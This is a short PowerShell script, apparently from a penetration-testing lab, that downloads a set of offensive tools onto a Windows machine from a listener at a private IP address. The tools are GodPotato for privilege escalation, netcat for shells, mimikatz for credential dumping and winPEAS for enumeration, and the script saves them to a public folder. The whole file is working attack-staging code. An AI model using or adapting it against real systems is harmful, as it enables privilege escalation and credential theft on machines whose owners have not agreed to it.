# Specify the URL of your Ubuntu server and the file names
$ubuntuServerUrl = "http://192.168.45.232:8000/"
$fileNames = @("GodPotato-NET4.exe", "nc.exe", "mimikatz.exe", "winPEASx64.exe")

# Specify the local directory on your Windows machine where you want to save the files
$localDirectory = "C:\Users\Public\Documents"

# Loop through each file and download it
foreach ($fileName in $fileNames) {
    $downloadUrl = "$ubuntuServerUrl$fileName"
    $localFilePath = Join-Path -Path $localDirectory -ChildPath $fileName

    Write-Host "Downloading $fileName..."
    Invoke-WebRequest -Uri $downloadUrl -OutFile $localFilePath

    Write-Host "Download complete: $localFilePath`n"
}

Write-Host "All files have been downloaded."

